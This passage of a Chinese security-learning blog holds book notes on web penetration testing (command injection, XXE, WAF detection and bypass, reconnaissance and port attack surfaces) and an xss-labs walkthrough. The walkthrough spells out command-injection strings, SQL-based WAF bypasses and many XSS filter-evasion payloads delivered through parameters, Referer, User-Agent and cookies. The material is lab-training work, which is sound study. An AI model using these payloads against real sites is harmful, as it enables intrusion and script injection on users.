+<h3 id="4-7-文件上传漏洞"><a href="#4-7-文件上传漏洞" class="headerlink" title="4.7 文件上传漏洞"></a>4.7 文件上传漏洞</h3><p>可以看我之前写的文章：<a href="/2023/05/15/Upload-Labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AE%AD%E7%BB%83/Upload-Labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AE%AD%E7%BB%83/">http://limbus.top/2023/05/15/Upload-Labs文件上传训练/Upload-Labs文件上传训练/</a></p>
+<h3 id="4-8-暴力破解"><a href="#4-8-暴力破解" class="headerlink" title="4.8 暴力破解"></a>4.8 暴力破解</h3><p>略</p>
+<p>修复建议：设置用户和IP登录阈值，超过次数就锁定账号或IP。</p>
+<h3 id="4-9-命令执行"><a href="#4-9-命令执行" class="headerlink" title="4.9 命令执行"></a>4.9 命令执行</h3><h4 id="4-9-1-介绍"><a href="#4-9-1-介绍" class="headerlink" title="4.9.1 介绍"></a>4.9.1 介绍</h4><p>有些可以执行命令的函数，PHP中有system, exec, shell_exec, passthru, popen, proc_popen等函数</p>
+<h4 id="命令执行漏洞攻击"><a href="#命令执行漏洞攻击" class="headerlink" title="命令执行漏洞攻击"></a>命令执行漏洞攻击</h4><p>支持ping:</p>
+<p> windows 系统管道符 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|   直接执行后面的语句   ping 192.168.1.1 | whoami</span><br><span class="line">||  前面语句执行出错时执行   ping 4 | whoami</span><br><span class="line">&amp;   前面语句为假则直接执行后面语句，前面语句可真可假</span><br><span class="line">&amp;&amp;  前面语句为假直接出错，不执行后面语句，只能为真  ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+
+<p>linux系统管道符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;   顺序执行</span><br><span class="line">|   显示后面语句执行结果</span><br><span class="line">|| &amp;  &amp;&amp;  和windows 一样</span><br></pre></td></tr></table></figure>
+
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol>
+<li>尽量不要使用命令执行函数</li>
+<li>在执行时要做好过滤和检测</li>
+<li>在使用动态函数之前，确保使用的函数是指定的函数之一</li>
+<li>对PHP语言来说，不能完全控制的危险函数最好不要使用</li>
+</ol>
+<h3 id="4-10-逻辑漏洞挖掘"><a href="#4-10-逻辑漏洞挖掘" class="headerlink" title="4.10 逻辑漏洞挖掘"></a>4.10 逻辑漏洞挖掘</h3><h4 id="4-10-1-介绍"><a href="#4-10-1-介绍" class="headerlink" title="4.10.1 介绍"></a>4.10.1 介绍</h4><p>指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能。越权访问又有水平越权和垂直越权。</p>
+<p>水平越权：相同级别权限的用户或同一角色中不同的用户之间，可以越权访问、修改或者删除其他用户信息的非法操作。</p>
+<p>垂直越权：就是不同级别之间的用户或不同角色之间用户的越权，比如普通用户可以执行管理员才能执行的功能。</p>
+<h3 id="4-11-XXE漏洞"><a href="#4-11-XXE漏洞" class="headerlink" title="4.11 XXE漏洞"></a>4.11 XXE漏洞</h3><h4 id="4-11-1-介绍"><a href="#4-11-1-介绍" class="headerlink" title="4.11.1 介绍"></a>4.11.1 介绍</h4><p>XML外部实体注入（XML External ENtity），XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。DTD可以是内部声明也可以引用外部DTD，如下所示</p>
+<p>内部声明DTD格式：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+<p>外部DTD格式：<code> &lt;!DOCTYPE 根元素 SYSTEM&quot;文件名&quot;&gt;</code></p>
+<p>在DTD中进行实体声明时，将使用ENTITY关键字来声明。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体可在内部或外部进行声明。</p>
+<p>内部声明实体格式： <code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
+<p>外部 实体格式： <code>&lt;!ENTITY 实体名称 SYSTEM “URL&quot;&gt;</code></p>
+<h3 id="4-12-WAF"><a href="#4-12-WAF" class="headerlink" title="4.12 WAF"></a>4.12 WAF</h3><h4 id="4-12-1介绍"><a href="#4-12-1介绍" class="headerlink" title="4.12.1介绍"></a>4.12.1介绍</h4><p>分类：</p>
+<p>1.软件型WAF：安装在服务器上的WAF，可以接触到服务器上的文件，直接检测服务器上是否存在webshell、是否有文件被创建等。</p>
+<p>2.硬件型WAF：硬件形式部署到链路中，当串联到链路中时可以拦截流量，在旁路监听模式时只记录攻击不进行拦截。</p>
+<p>3.云WAF：一般以反向代理的形式工作，通过配置NS记录或CNAME记录，使对网站的请求报文优先经过WAF主机，经过WAF过滤后，再发送给实际服务器。</p>
+<p>4.网站系统内置的WAF：网站系统中内置的过滤，直接镶嵌再代码中，相对来说自由度高，输入参数强制类型转换，输入参数合法性检测，关键函数执行，对输入的数据进行替换过滤后再继续执行。</p>
+<h4 id="4-12-2-WAF-判断"><a href="#4-12-2-WAF-判断" class="headerlink" title="4.12.2 WAF 判断"></a>4.12.2 WAF 判断</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.SQLMap 使用SQLMap 可以识别出WAF的种类，但如果安装的WAF没有特征，SQLMap只能识别出类型时Generic。</span><br><span class="line">sqlmap.py -u &quot;http://xxxx.com&quot; --identify-waf --batch</span><br><span class="line"></span><br><span class="line">2.手工判断</span><br><span class="line">在网站后面添加select 等语句，触发防护</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-12-3-WAF绕过"><a href="#4-12-3-WAF绕过" class="headerlink" title="4.12.3 WAF绕过"></a>4.12.3 WAF绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.大小写绕过</span><br><span class="line">2.URL编码、二次编码</span><br><span class="line">3.替换关键字，双写绕过</span><br><span class="line">4.使用注释截断</span><br><span class="line">5.多参数请求拆分  and a=union /*and b=*/select 1,2,3,4</span><br><span class="line">6.HTTP参数污染，同一参数出现多次，不同的中间件解析为不同结果。Inject=union/*inject=*/select/*&amp;inject=*/1&amp;inject=2&amp;inject=3&amp;inject=4</span><br><span class="line">7.用生僻函数代替常用函数，例如在报错注入中使用polygon()函数代替常用的updatexml()函数。SELECT polygon(select * from (select * from (select @@version)f)x);</span><br><span class="line">8.寻找网站源站IP---云WAF</span><br><span class="line">9.注入参数到cookies中，如果代码中使用了$_REQUEST获取参数，会依次从GET/POST/cookies中获取参数，如果WAF只检测了GET/POST，可以从cookies注入。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/H-Limbus/myBlogImage@LoadImg/img/202305161938641.png" alt="image-20230428064150743"></p>
+<h1 id="0x04-Metasploit-技术"><a href="#0x04-Metasploit-技术" class="headerlink" title="0x04 Metasploit 技术"></a>0x04 Metasploit 技术</h1><p>可以看我的这篇文章   <a href="/2023/05/17/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/">Metasploit渗透测试指南</a></p>
+<p>是 metasploit 攻防指南的读书笔记，要更全面一些。</p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+        <category>Web安全攻防：渗透测试指南</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+        <tag>读书笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x01 搭建环境实战</title>
+    <url>/2023/05/15/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97--%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="2-1-在linux系统中安装LANMP"><a href="#2-1-在linux系统中安装LANMP" class="headerlink" title="2.1 在linux系统中安装LANMP"></a>2.1 在linux系统中安装LANMP</h4><p>LANMP(linux、Apache、Nginx、MySQL和PHP)</p>
+<h4 id="2-2-Windows系统中安装WAMP"><a href="#2-2-Windows系统中安装WAMP" class="headerlink" title="2.2 Windows系统中安装WAMP"></a>2.2 Windows系统中安装WAMP</h4><p>可以用小皮代替</p>
+<span id="more"></span>
+<h4 id="2-3-安装DVWA-靶场"><a href="#2-3-安装DVWA-靶场" class="headerlink" title="2.3 安装DVWA 靶场"></a>2.3 安装DVWA 靶场</h4><p>略</p>
+<h4 id="2-4-安装SQLi-Labs-靶场"><a href="#2-4-安装SQLi-Labs-靶场" class="headerlink" title="2.4 安装SQLi-Labs 靶场"></a>2.4 安装SQLi-Labs 靶场</h4><p>对于这个靶场的解题，请移步到<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/">sqli-labs 练习</a></p>
+<h4 id="2-5-搭建xss-测试平台"><a href="#2-5-搭建xss-测试平台" class="headerlink" title="2.5 搭建xss 测试平台"></a>2.5 搭建xss 测试平台</h4><p>本书介绍的xss平台是基于xsser.me 源码的，我没有安装，我之前玩的是xss-labs。对xss-labs的题解，请移步  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/XSS%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0/">xss-labs 练习</a></p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+        <category>Web安全攻防：渗透测试指南</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+        <tag>读书笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x00 信息收集</title>
+    <url>/2023/05/15/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97--%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="1-收集域名"><a href="#1-收集域名" class="headerlink" title="1.收集域名"></a>1.收集域名</h4><pre><code>whois 查询：whois 是一个标准的互联网协议，收集域名注册人信息，IP地址等。
+kali  直接 whois xxxx.com ， 网站有 https://whois.aizhan.com、 http://whois.chinaz.com、 https://www.virustotal.com
+
+备案信息查询： ICP备案查询网：http://www.beianbeian.com
+                                天眼查  ：http://www.tianyancha.com
+</code></pre>
+<h4 id="2-收集敏感信息"><a href="#2-收集敏感信息" class="headerlink" title="2.收集敏感信息"></a>2.收集敏感信息</h4><pre><code>Google语法：site(域名)、inurl(url中关键字)、intext(网页中正文)、filetype(文件类型)、intitle(标题关键字) link(返回查询语法的做了链接的url)、 info(一些站点的基本信息)、cache(缓存)
+
+github 中搜索一些关键的key
+</code></pre>
+<span id="more"></span>
+<h4 id="3-子域名检测工具"><a href="#3-子域名检测工具" class="headerlink" title="3.子域名检测工具"></a>3.子域名检测工具</h4><pre><code>Layer子域名挖掘机、K8、wydomain、sublist3r、dnsmaper、 ksubdomain、subDomainsBrute、Maltego CE、dnsub 等
+
+搜索引擎枚举
+site:baidu.com
+
+网站聚合搜索
+    网址： https://rapiddns.io/subdomain
+          https://dnsdumpster.com/
+
+证书透明度公开日志枚举
+证书透明度（CT）是证书授权机构（CA）的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址。
+在线网站：https://crt.sh  和  censys
+</code></pre>
+<h4 id="4-收集常用端口"><a href="#4-收集常用端口" class="headerlink" title="4.收集常用端口"></a>4.收集常用端口</h4><pre><code>nmap : 常用的扫描方法是 -Ss  -Pn  -Sn
+无状态端口扫描 Masscan、御剑TCP端口扫描工具
+
+常用端口
+21/22/69 ftp/xftp 文件传输协议
+2049        nfs 服务
+139         samba 服务     ---爆破、未授权访问、远程代码执行
+389         Ldap 目录访问协议
+
+远程连接服务端口
+22    ssh 远程连接      爆破、ssh 隧道及内网代理转发、文件传输
+23    telnet 远程连接   爆破、嗅探、弱口令
+3389  rdp远程桌面连接    爆破
+5900  VNC               弱口令
+5632  pyanywhere服务    抓密码、代码执行
+
+web应用服务端口
+80/443/8080                    web攻击、爆破、版本漏洞
+7001/7002     weblogic控制台   java反序列化、弱口令
+8080/8089    Jboss/Resin/Jetty/Jenkins  反序列化
+9090          websphere控制台    java反序列化、弱口令
+4848     GlassFish控制台       弱口令
+1352     lotus domino邮件      弱口令、信息泄露、爆破
+10000    webmin-web控制面板    弱口令
+
+数据库服务端口
+3306        MySQL        提权、爆破
+1433        MSSQl        提权、SA弱口令、爆破
+1521        Oracle       TNS 爆破、反弹shell
+5432        PostgreSQL   爆破、弱口令
+27017/27018  MongoDB     爆破、未授权访问
+6379        Redis        未授权访问、弱口令
+5000        sysbase/db2  爆破、注入
+
+邮件服务端口
+25    SMTP      邮件伪造
+110   POP3      爆破、嗅探
+143   IMAP      爆破
+
+网络常见协议端口
+53    DNS域名系统    允许区域传送、DNS劫持、缓存投毒、欺骗
+67/68  DHCP服务      劫持、欺骗
+161    SMTP协议      爆破、搜集目标内网信息
+
+特殊服务端口
+2181          zookeeper          未授权访问
+8069          zabbix             远程执行、SQL注入
+9200/9300     elasticsearch      远程执行
+11211         memcache           未授权访问
+512/513/514   linux rexec       爆破、Rlogin登录
+873            Rsync            匿名访问、文件上传
+3690          svn 服务           svn 泄露、未授权访问
+50000        SAP ManagementConsole    远程执行
+</code></pre>
+<h4 id="1-5指纹识别"><a href="#1-5指纹识别" class="headerlink" title="1.5指纹识别"></a>1.5指纹识别</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMS(整站系统或文章系统)</span><br><span class="line">常见CMS:</span><br><span class="line">Dedecms(织梦)、discuz、phpweb、phpwind、phpcms、Ecshop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等</span><br><span class="line"></span><br><span class="line">代表工具：御剑web指纹识别、whatweb、webrobo、椰树</span><br><span class="line">在线工具：</span><br><span class="line">	bugscaner:http://whatweb.bugscaner.com/look</span><br><span class="line">	云悉指纹: http://www.yunsee.cn/finger.html</span><br><span class="line">	https://whatweb.net</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-6查找真实IP-主要绕过CDN"><a href="#1-6查找真实IP-主要绕过CDN" class="headerlink" title="1.6查找真实IP(主要绕过CDN)"></a>1.6查找真实IP(主要绕过CDN)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直接ping 看域名</span><br><span class="line">超级ping 使用国内国外不同IP，ping目标IP，一般有的CDN国内各地IP不同，国外相同，是因为没有在国外设置CDN，那一般就是真实IP，国外网站：https://www.netcraft.com</span><br><span class="line">邮件IP，一般邮件系统的IP是不经过CDN的</span><br><span class="line">扫描网站测试文件，如phpinfo,test等，从而找到真实IP</span><br><span class="line">分站域名，ping二级域名</span><br><span class="line">使用app找域名</span><br><span class="line">绕过CloudFlare CDN找真实IP， https://www.crimeflare.us/cfs.html#box</span><br><span class="line"></span><br><span class="line">验证获取的是否为真实IP：直接用IP访问，查看域名，扫描端口</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-7收集敏感目录文件"><a href="#1-7收集敏感目录文件" class="headerlink" title="1.7收集敏感目录文件"></a>1.7收集敏感目录文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以探测后台管理页面、文件上传界面、甚至源代码</span><br><span class="line"></span><br><span class="line">工具：DirBuster、御剑后台扫描珍藏版、wwwscan、spider.py、dirsearch.py、weakfilescan</span><br><span class="line">在线工具： WebScan  http://www.webscan.cc</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-8-社会工程学"><a href="#1-8-社会工程学" class="headerlink" title="1.8 社会工程学"></a>1.8 社会工程学</h4><p>略</p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+        <category>Web安全攻防：渗透测试指南</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+        <tag>读书笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xss-labs漏洞练习</title>
+    <url>/2023/05/15/XSS-Labs%E7%BB%83%E4%B9%A0/XSS-Labs%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>上一次我们练习了文件上传的漏洞，今天我们来看看这个xss跨站攻击漏洞，这个漏洞的作用就是通过在web 站点，向客户端交付恶意脚本代码，实现对客户端的攻击。</p>
+<p>xss漏洞分为反射型，存储型，DOM型</p>
+<h2 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h2><p>我们先来查看这一关，看到链接后面有一个name&#x3D;test，当我们改变后面的值，发现页面里面的值也改变了，所以页面的值是由get的链接后面的name值来控制的。我们尝试在name后面输入最简单的xss,  <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>，发现直接过关了。说明已经触发了xss漏洞。这个是在get链接里面控制的，所以这是个反射性漏洞。</p>
+<span id="more"></span>
+
+<h2 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h2><p>这一关我们发现有一个输入框，那肯定是在输入框这儿有xss漏洞，我们尝试输入<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>发现没有成功，那说明格式不对，我们查看源代码，发现可以使用闭合，我们输入的值被赋予给了value：<code>&lt;input name=&quot;keyword&quot; value=&quot;1&quot;&gt;</code> 所以我们可以闭合<code>&lt;input&gt;</code>这个标签，使script语句可以执行，可以构造  <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现成功绕过。</p>
+<p>我查看了一下源代码，发现这个函数，htmlspecialchars()，这个函数的作用是把预定义字符，包括&amp;，“ ,‘ ,&lt;,&gt;这些。这两个符号转化为html实例，不会当成标签来执行。所以我们不能在h2标签的地方闭合。</p>
+<h2 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h2><p>我们来到这一关，尝试输入之前的js语句，发现没有用，于是我们查看一下源代码，发现在value的地方也使用了  htmlspecialchars() 这个函数，也就是说会把&lt;&gt;变成实例来执行，不会当成脚本来执行，所以我们不能出现&lt;&gt;，所以我们可以使用下面的方法。</p>
+<p>使用onfocus，onfocus是javascript中在对象获得焦点时发生的事件,最简单的实例就是网页上的一个输入框,当使用鼠标点击该输入框时输入框被选中可以输入内容的时候就是该输入框获得焦点的时候,此时输入框就会触发onfocus事件.因此点击当前页面的输入框就可以完成弹框了。所以我们构造的语句是  <code>’onfocus=javascript:alert(1)&#39;</code>，前后面的引号是为了闭合value的引号。</p>
+<p>使用onclick，这个和上面的函数一样，只是需要点击一下才会触发，构造语句<code>&#39;onclick=javascript:alert(1);&#39;</code></p>
+<p>使用onmousemove ， 和上面的一样，只是需要将鼠标移到对应的地方，构造语句<code>&#39;onmouseover=&#39;alert(1);</code>还有很多函数都有效果，这里不一一列举了。</p>
+<h2 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h2><p>这个和上关有些类似，上一关的闭合是用的单引号，而这一关闭合用的是双引号，直接使用上面的语句，成功绕过。</p>
+<p>看来一眼有源代码，发现和上一关并不一样，这一关是将&lt;&gt;这两个符号给替换掉了所以只要没有&lt;&gt;就行了，上面个的语句依旧适用。</p>
+<h2 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h2><p>在这一关我们照旧输入最原始的<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>，查看网页代码，发现在from表单中，input的value值中，script变成了sc_ript所以说这里对于script做了过滤，那我们尝试其他方法，使用oncilck来构造，”onclick&#x3D;”alert(1);，结果还是没有成功，发现对于on也是做了过滤，将on变成了o_n，查看页面的源代码，发现果然是这样，将&lt;script，和on做了过滤。</p>
+<p>那我们就可以构造一个链接的形式来触发js脚本，这样构造语句，<code>&quot;&gt;&lt;a href=javascript:alert(1);</code>，只要我们点击这个链接，我们就成功过关了。</p>
+<h2 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h2><p>这一关我们尝试了之前的一些方法，发现不仅过滤了script ,on, 还有，href, src , 和data,于是我们查看源代码，发现对于输入的值没有做大小写的过滤，而在第五关的时候是把所有的大写转换为小写了的，所以我们不能利用大小写来突破，但是这一关可以，不管是href, src ,&lt;script，都可以，但是利用data这个我不是很清楚，花了点时间在网上搞清楚了。</p>
+<p>首先我们来看利用href，构造语句，<code>&quot;&gt;&lt;a Href=&quot;javascript:alert(1)&quot;</code>便可以达到效果。</p>
+<p>我们来看使用src 的方法：因为src是标签img中的参数，所以我们构造语句，<code>&quot;&gt;&lt;img Src=&quot;#&quot; Onerror=&quot;alert(1)&quot;</code>便可以达到效果，这里这个src是图片的地址，一个#就表明是返回到本页面，而后面的Onerror 表示的是当图片加载失败的时候，就执行这个脚本代码。</p>
+<p>我们来看使用<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>但是script 要大小写混用，方便绕过。</p>
+<p>还可以使用svg&#x2F;onload&#x3D;setTimeout(‘alert(1)’,0)，这个是加载svg文件的一个函数，当这个函数被加载的时候，就会执行这个时间，settimeout()这个函数的意思是在多少毫秒之后在执行这个语句。</p>
+<p>data这个形式的语句是这样写的，<code>&lt;iframe src=&#39;data:text/html;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==&#39;&gt;&lt;/iframe&gt;</code>src加载data和执行<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>是一样的。base64表明使用的是base64编码，后面是内容。这个data除了在iframe中可以执行，还有这些：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:%26comma;alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h2><p>这一关首先我输入&lt;script,href,src,data,SRC，然后看一下回显怎么样，判断这一关的限制是什么，结果发现都不见了，说明对于这些都直接过滤了，包括大小写。我们查看源代码，发现对于上面的这些，都是用空字符代替了，我们发现这个只是执行了一遍，所以我们可以使用双写绕过。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">scriscriptpt</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">scriscriptpt</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hrehreff</span>=<span class="string">&#x27;javascrscriptipt:alert(1);&#x27;</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srsrcc</span>=<span class="string">&#x27;dadatata:text/html;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>     //不知道为什么执行不成功</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">object</span> <span class="attr">dadatata</span>=<span class="string">dadatata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span>    //不知道为什么执行不成功</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">srsrcc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">oonnerror</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>双写大部分都可以绕过。</p>
+<h2 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a>第八关：</h2><p>这一关我们尝试之前的值，然后查看源代码，发现是往href中添加链接，当我们直接使用<code>javascript:alert(1)</code>发现script被限制了，然后我们使用data流来尝试，发现data,src,href都被过滤了。</p>
+<p>那我们来尝试一下编码，将<code>javascript:alert(1)</code>进行unicode的编码，</p>
+<p>python把语句转换一下，一定要转换成  &amp;#x    ;这种格式的。成功绕过。</p>
+<h2 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a>第九关：</h2><p>这一关我们直接查看源代码，发现这个是和上关一样的，唯一不一样的是在对于输入的地方有一个检测，检测里面有没有http:&#x2F;&#x2F;，也就是检测输入的是不是一个链接，那么我们就可以在javascript的语句后面加上一个http:&#x2F;&#x2F;，但是这个语句一定要被注释掉，确保它不会影响我们的js语句，js中的注释是&#x2F;&#x2F;，哦，对了，既然和上关一样的话，我们还是要用编码的方式来插入我们的j语句。所以整体的语句是<code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;//http://</code>，然后完美插入语句。或者用另一种注释&#x2F;**&#x2F;</p>
+<p><code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;/*http://*/</code></p>
+<h2 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a>第十关：</h2><p>这一关我们打开，映入眼帘的没有需要输入的框框，所以我还以为是get提交参数的xss，但是当我输入之后，却没有什么变化，按F12查看网页代码，发现表单里面有三个input标签被隐藏了，我们尝试在get中输入这三个参数，看看哪个参数是有效的，测试发现t_sort这个参数会把输入的值加入到value中，那么这个就是一个突破点，我们尝试输入<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，结果发现提交的参数会把&lt;&gt;过滤掉，那我们就使用点击触动，<code>&quot; onclick=javascript:alert(1); type=&quot;text&quot;</code>，后面的type是为了把type&#x3D;hidden这个参数给取消掉，因为在html中，如果在一个标签里面有两个参数的话，后面的参数不会被执行，把这个<code>&lt;input&gt;</code>标签给显示出来，因为我们要点击它呀。当我们输入这个之后，页面出现一个输入框，点击它，成功过关。</p>
+<p>这一关还可以用onmousemove，onmouseover，onfocus等这些都是可以的。</p>
+<h2 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h2><p>这一关我们查看网页代码，发现这一关多了一个被隐藏的标签，叫做t_ref ，当我们从上一关进来之后，发现t_ref的value是上一关的网址，所以我们猜测这个t_ref是获取网页的referer。但是我们尝试其他三个标签，发现t_sort还是有值的，我尝试了之前的payload，但是都没有用，一查看源代码，发现t_sort这儿的值也被htmlspecialchars()了，相反，在referer这里，倒是没有什么过滤，所以我们要从这里下手，我们使用hackbar工具来访问，可以添加referer，把referer的语句写为：<code>&quot; onclick=javascript:alert(1); type=&quot;text</code>这时候的type也是来取消这个隐藏。发现成功绕过。</p>
+<p>用onmousemove，onmouseover，onfocus等这些也都是可以的。</p>
+<h2 id="第十二关："><a href="#第十二关：" class="headerlink" title="第十二关："></a>第十二关：</h2><p>这一关和上一关一样，但是不是来自referer，而是user_agent，所以我们在ua这里构造语句，语句和上一关一样，而且onmousemove，onmouseover，onfocus这些都是可以的。</p>
+<h2 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h2><p>这一关和上面的一样，不同的是来自cookie的，使用hackbar来添加cookie ，但是这儿有一个要注意的，在javascript:alert(1)后面不能加上;号，加上后面的type执行不成功，所以添加的cookie语句是<code>user=&quot; onclick=&quot;javascript:alert(1)&quot; type=&quot;text</code>。</p>
